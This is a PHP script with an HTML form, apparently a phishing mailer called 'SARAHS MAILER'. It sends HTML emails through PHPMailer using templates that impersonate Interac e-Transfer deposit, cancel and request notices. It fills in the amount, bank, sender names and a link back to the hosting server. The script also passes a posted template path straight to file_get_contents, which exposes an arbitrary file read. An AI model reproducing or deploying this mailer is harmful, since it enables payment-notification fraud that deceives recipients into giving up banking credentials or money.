<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require ("PHPMailer/src/PHPMailer.php");
require ("PHPMailer/src/SMTP.php");
require ("PHPMailer/src/Exception.php");

// Retrieve form data
$subject = $_POST['subject'];
$template_file = $_POST['template'];

$template = file_get_contents($template_file); 
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $template);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);

// Create PHPMailer object and set properties
$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tsl';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message;
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('<smtp@email.com>', $_POST['sender_name']);
$mail->AddAddress($_POST['receiver_email']);

// Set email subject from dropdown menu
$mail->Subject = $subject;

$mail->IsHTML(true);
$mail->CharSet="utf-8";

// Send email and display error message if it fails
if(!$mail->Send()) {
	echo "Mailer Error: " . $mail->ErrorInfo;
}

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>PHPMailer HTML Form</title>
</head>
<body>

<h1>SARAHS MAILER</h1>
	<form action="submit4.php" method="post">

	<input type="hidden" name="link" value="<?php echo $_SERVER['HTTP_HOST']; ?>" required>
	
	<label for="subject">Select Subject:</label>
	<select name="subject" id="subject">
		<option value="NULL">EMAIL : SUBJECT</option>
		<option value="INTERAC e-Transfer: <?php echo $_POST['sender_name'] ?>' sent you money.">Interac : Deposit</option>
		<option value="INTERAC e-Transfer: <?php echo $_POST['sender_name'] ?>' has Canceled the request.">Interac : Cancel</option>
		<option value="INTERAC e-Transfer: <?php echo $_POST['sender_name'] ?>' sent you money.">Interac : Request [n/a]</option>
	</select>
	
	<label for="template">Select Template:</label>
	<select name="template" id="template">
		<option value="NULL">EMAIL | TEMPLATE</option>
		<option value="/email_temp/interac/Deposit.html">Interac : deposit</option>
		<option value="/email_temp/interac/CancelNotice.html">Interac : Cancel </option>
		<option value="/email_temp/interac/request.html">Interac : Request [n/a]</option>
	</select>

		<br><br>	
	<label for="amount">ETRANSER | AMOUNT</label>
	<input type="text"   name="amount" Value="100.00" step="0.01"  required>
		<br><br>

		<label for="expiredate">Expire Date:</label>
        <input type="text"   name="expiredate" Value=", 2023" placeholder="May 8,2023" required>
		<br><br>

         <br><br>
		<label for="sender_name">Sender Name:</label>
        <input type="text"   name="sender_name" value="TRIPLE X OILFIELD LTD" required>
		<input type="text"   name="recr_name" value="notify@interac.etransfer.ca" required>
        <br><br>
        <label for="receiver_name">Receiver name:</label>      
        <input type="text"   name="receiver_name" value="One-time Contact" required>
		<label for="receiver_name">Receiver email:</label>
        <input type="email"   id="search"  name="receiver_email" value="insertarealeamilhere@yopmail.com"  required>
		<br><br>
		<input type="submit" value="Send Email">

	</form>
</body>
</html>